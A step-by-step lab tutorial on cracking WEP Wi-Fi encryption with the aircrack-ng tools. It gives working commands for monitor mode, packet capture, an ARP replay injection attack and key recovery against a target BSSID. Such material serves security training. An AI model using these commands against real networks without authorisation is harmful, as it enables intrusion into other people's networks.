
# Step-by-Step Guide: WEP Attack
---

## **1. Set Up the Lab Environment**
- **Access Point (AP):** Configure a wireless network using WEP encryption.
- **Wi-Fi Adapter:** Use a network adapter that supports monitor mode and packet injection.
- **Kali Linux:** Ensure the system has Kali Linux installed with the required tools.
- **Client Devices:** Connect one or more devices to the WEP network to simulate normal network traffic.

---

## **2. Enable Monitor Mode**
1. Identify the wireless interface:
   ```bash
   iwconfig
   ```
2. Enable monitor mode on the adapter:
   ```bash
   airmon-ng start wlan0
   ```
   Replace `wlan0` with the name of your wireless interface. This will create a virtual interface (e.g., `wlan0mon`).

---

## **3. Scan for Networks**
1. Scan for nearby wireless networks:
   ```bash
   airodump-ng wlan0mon
   ```
2. Note the following details about the target WEP network:
   - **BSSID** (MAC address of the AP)
   - **Channel** (the network’s operating channel)
   - **ESSID** (network name)

---

## **4. Capture Packets**
1. Start capturing packets from the target network:
   ```bash
   airodump-ng --bssid <BSSID> --channel <channel> -w capturefile wlan0mon
   ```
2. Replace:
   - `<BSSID>`: The target AP’s MAC address.
   - `<channel>`: The channel the network is operating on.
3. Packets will be saved to a file (e.g., `capturefile-01.cap`).

---

## **5. Stimulate Network Traffic (Optional)**
1. Use an ARP replay attack to generate additional packets:
   ```bash
   aireplay-ng -3 -b <BSSID> wlan0mon
   ```
2. This sends ARP packets to the AP, forcing it to generate more encrypted packets and increasing the number of Initialization Vectors (IVs).

---

## **6. Monitor IV Count**
1. In the `airodump-ng` window, check the `#Data` field.
2. Minimum IVs required:
   - **20,000 IVs** for a 64-bit WEP key.
   - **40,000 IVs** for a 128-bit WEP key.

---

## **7. Crack the WEP Key**
1. Use `aircrack-ng` to crack the WEP key:
   ```bash
   aircrack-ng -b <BSSID> capturefile-01.cap
   ```
2. Replace `<BSSID>` with the target AP’s MAC address.
3. If successful, the tool will display the WEP key, e.g., `Key Found: [ 12:34:56:78:90 ]`.

---

## **8. Verify the Key**
1. Use the cracked key to connect to the WEP network from a client device.
2. Ensure successful authentication to confirm the key's validity.
